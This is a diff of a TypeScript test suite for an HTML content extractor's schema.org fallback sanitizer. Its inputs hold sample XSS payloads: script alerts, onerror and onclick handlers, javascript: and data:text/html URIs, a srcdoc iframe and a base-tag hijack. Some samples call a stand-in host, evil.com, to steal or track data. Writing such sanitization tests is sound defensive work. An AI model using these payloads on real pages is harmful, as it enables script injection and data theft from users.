@@ -225,11 +225,21 @@ describe('Schema.org text fallback', () => {
 	});
 });
 
+/**
+ * Security tests for the schema.org text fallback path.
+ *
+ * To trigger the fallback, the schema text word count must exceed the
+ * extracted content word count. We achieve this by putting a short
+ * <article> (which the scorer favors) alongside a longer <div> that
+ * contains the schema text plus dangerous elements.
+ */
 describe('Schema.org text fallback sanitization', () => {
-	test('strips script tags from schema fallback content', () => {
-		const postText = 'This is a social media post with enough words to trigger the schema text fallback path. We need the word count to exceed what the content scorer extracts from the page so the fallback kicks in and searches the DOM.';
+	// Helper: build HTML where the schema fallback triggers and the
+	// matched DOM element contains the given dangerous HTML.
+	function buildSchemaFallbackHtml(dangerousHtml: string): string {
+		const schemaText = 'This is the full post body with enough words to exceed the short article summary that the content scorer will extract. Adding more sentences here to make sure the word count difference is large enough to reliably trigger the schema text fallback path in the parse method.';
 
-		const html = `
+		return `
 		<!DOCTYPE html>
 		<html>
 		<head>
@@ -237,55 +247,39 @@ describe('Schema.org text fallback sanitization', () => {
 			<script type="application/ld+json">
 			{
 				"@type": "SocialMediaPosting",
-				"text": "${postText}"
+				"text": "${schemaText}"
 			}
 			</script>
 		</head>
 		<body>
-			<div class="post">
-				<p>${postText}</p>
-				<script>alert('xss')</script>
+			<article>
+				<h1>Title</h1>
+				<p>Short article summary.</p>
+			</article>
+			<div class="full-post">
+				<p>${schemaText}</p>
+				${dangerousHtml}
 			</div>
 		</body>
 		</html>`;
+	}
 
+	test('strips script tags from schema fallback content', () => {
+		const html = buildSchemaFallbackHtml('<script>alert("xss")</script>');
 		const doc = createDocument(html);
-		const defuddle = new Defuddle(doc);
-		const result = defuddle.parse();
+		const result = new Defuddle(doc).parse();
 
-		expect(result.content).toContain('social media post');
+		expect(result.content).toContain('full post body');
 		expect(result.content).not.toContain('<script');
 		expect(result.content).not.toContain('alert');
 	});
 
 	test('strips event handlers from schema fallback content', () => {
-		const postText = 'This post contains an image with a malicious event handler that should be stripped during the schema text fallback. Adding more words here to ensure we exceed the extracted content word count threshold.';
-
-		const html = `
-		<!DOCTYPE html>
-		<html>
-		<head>
-			<title>Test</title>
-			<script type="application/ld+json">
-			{
-				"@type": "SocialMediaPosting",
-				"text": "${postText}"
-			}
-			</script>
-		</head>
-		<body>
-			<div class="post">
-				<p>${postText}</p>
-				<img src="x.jpg" onerror="alert('xss')" onclick="steal()">
-			</div>
-		</body>
-		</html>`;
-
+		const html = buildSchemaFallbackHtml('<img src="x.jpg" onerror="alert(\'xss\')" onclick="steal()">');
 		const doc = createDocument(html);
-		const defuddle = new Defuddle(doc);
-		const result = defuddle.parse();
+		const result = new Defuddle(doc).parse();
 
-		expect(result.content).toContain('malicious event handler');
+		expect(result.content).toContain('full post body');
 		expect(result.content).not.toContain('onerror');
 		expect(result.content).not.toContain('onclick');
 		expect(result.content).not.toContain('alert');
@@ -293,39 +287,82 @@ describe('Schema.org text fallback sanitization', () => {
 	});
 
 	test('strips style elements from schema fallback content', () => {
-		const postText = 'This post has an embedded style element that could be used for CSS-based attacks or data exfiltration. We need enough words here to trigger the schema text fallback mechanism.';
-
-		const html = `
-		<!DOCTYPE html>
-		<html>
-		<head>
-			<title>Test</title>
-			<script type="application/ld+json">
-			{
-				"@type": "SocialMediaPosting",
-				"text": "${postText}"
-			}
-			</script>
-		</head>
-		<body>
-			<div class="post">
-				<style>.secret { background: url('https://evil.com/steal?data=123') }</style>
-				<p>${postText}</p>
-			</div>
-		</body>
-		</html>`;
-
+		const html = buildSchemaFallbackHtml('<style>.x { background: url("https://evil.com/steal") }</style>');
 		const doc = createDocument(html);
-		const defuddle = new Defuddle(doc);
-		const result = defuddle.parse();
+		const result = new Defuddle(doc).parse();
 
-		expect(result.content).toContain('embedded style element');
+		expect(result.content).toContain('full post body');
 		expect(result.content).not.toContain('<style');
 		expect(result.content).not.toContain('evil.com');
 	});
 
 	test('strips noscript elements from schema fallback content', () => {
-		const postText = 'This post contains a noscript element with potentially dangerous content that should be removed during sanitization. More words to trigger the fallback path reliably.';
+		const html = buildSchemaFallbackHtml('<noscript><img src="https://evil.com/track"></noscript>');
+		const doc = createDocument(html);
+		const result = new Defuddle(doc).parse();
+
+		expect(result.content).toContain('full post body');
+		expect(result.content).not.toContain('<noscript');
+		expect(result.content).not.toContain('evil.com');
+	});
+
+	test('preserves iframes in schema fallback content', () => {
+		const html = buildSchemaFallbackHtml(
+			'<iframe src="https://www.youtube.com/embed/abc123" width="560" height="315"></iframe>' +
+			'<iframe src="https://open.spotify.com/embed/track/xyz"></iframe>'
+		);
+		const doc = createDocument(html);
+		const result = new Defuddle(doc).parse();
+
+		expect(result.content).toContain('full post body');
+		expect(result.content).toContain('youtube.com/embed/abc123');
+		expect(result.content).toContain('spotify.com/embed/track/xyz');
+	});
+
+	test('strips srcdoc attribute from iframes in schema fallback content', () => {
+		const html = buildSchemaFallbackHtml(
+			'<iframe srcdoc="<script>alert(\'xss\')</script>"></iframe>'
+		);
+		const doc = createDocument(html);
+		const result = new Defuddle(doc).parse();
+
+		expect(result.content).toContain('full post body');
+		expect(result.content).not.toContain('srcdoc');
+		expect(result.content).not.toContain('alert');
+	});
+
+	test('strips object and embed elements from schema fallback content', () => {
+		const html = buildSchemaFallbackHtml('<object data="https://evil.com/flash.swf"></object><embed src="https://evil.com/plugin">');
+		const doc = createDocument(html);
+		const result = new Defuddle(doc).parse();
+
+		expect(result.content).toContain('full post body');
+		expect(result.content).not.toContain('<object');
+		expect(result.content).not.toContain('<embed');
+		expect(result.content).not.toContain('evil.com');
+	});
+
+	test('strips javascript: URIs from schema fallback content', () => {
+		const html = buildSchemaFallbackHtml('<a href="javascript:alert(\'xss\')">click me</a><a href="  javascript:void(0)">spaced</a>');
+		const doc = createDocument(html);
+		const result = new Defuddle(doc).parse();
+
+		expect(result.content).toContain('full post body');
+		expect(result.content).not.toContain('javascript:');
+	});
+
+	test('strips data:text/html URIs from schema fallback content', () => {
+		const html = buildSchemaFallbackHtml('<img src="data:text/html,<script>alert(1)</script>">');
+		const doc = createDocument(html);
+		const result = new Defuddle(doc).parse();
+
+		expect(result.content).toContain('full post body');
+		expect(result.content).not.toContain('data:text/html');
+	});
+
+	test('strips base tag to prevent URL hijacking', () => {
+		// base tag goes before the article, not inside the dangerous html helper
+		const schemaText = 'This is the full post body with enough words to exceed the short article summary that the content scorer will extract. Adding more sentences here to make sure the word count difference is large enough to reliably trigger the schema text fallback path in the parse method.';
 
 		const html = `
 		<!DOCTYPE html>
@@ -335,29 +372,31 @@ describe('Schema.org text fallback sanitization', () => {
 			<script type="application/ld+json">
 			{
 				"@type": "SocialMediaPosting",
-				"text": "${postText}"
+				"text": "${schemaText}"
 			}
 			</script>
 		</head>
 		<body>
-			<div class="post">
-				<p>${postText}</p>
-				<noscript><img src="https://evil.com/track"></noscript>
+			<base href="https://evil.com/">
+			<article>
+				<h1>Title</h1>
+				<p>Short article summary.</p>
+			</article>
+			<div class="full-post">
+				<p>${schemaText}</p>
 			</div>
 		</body>
 		</html>`;
 
 		const doc = createDocument(html);
-		const defuddle = new Defuddle(doc);
-		const result = defuddle.parse();
+		const result = new Defuddle(doc).parse();
 
-		expect(result.content).toContain('noscript element');
-		expect(result.content).not.toContain('<noscript');
-		expect(result.content).not.toContain('evil.com');
+		expect(result.content).toContain('full post body');
+		expect(result.content).not.toContain('<base');
 	});
 
 	test('schema text string fallback does not contain HTML injection', () => {
-		// Schema text that contains HTML but no DOM match exists
+		// Schema text that does NOT appear in the DOM → raw text fallback
 		const html = `
 		<!DOCTYPE html>
 		<html>
@@ -376,11 +415,9 @@ describe('Schema.org text fallback sanitization', () => {
 		</html>`;
 
 		const doc = createDocument(html);
-		const defuddle = new Defuddle(doc);
-		const result = defuddle.parse();
+		const result = new Defuddle(doc).parse();
 
-		// The raw schema text is used as content — verify it doesn't execute
-		// (schema text is plain text, not DOM HTML, so script tags are literal text)
+		// Raw schema text is used as content (plain text, not DOM HTML)
 		expect(result.content).toContain('Safe text');
 	});
 });
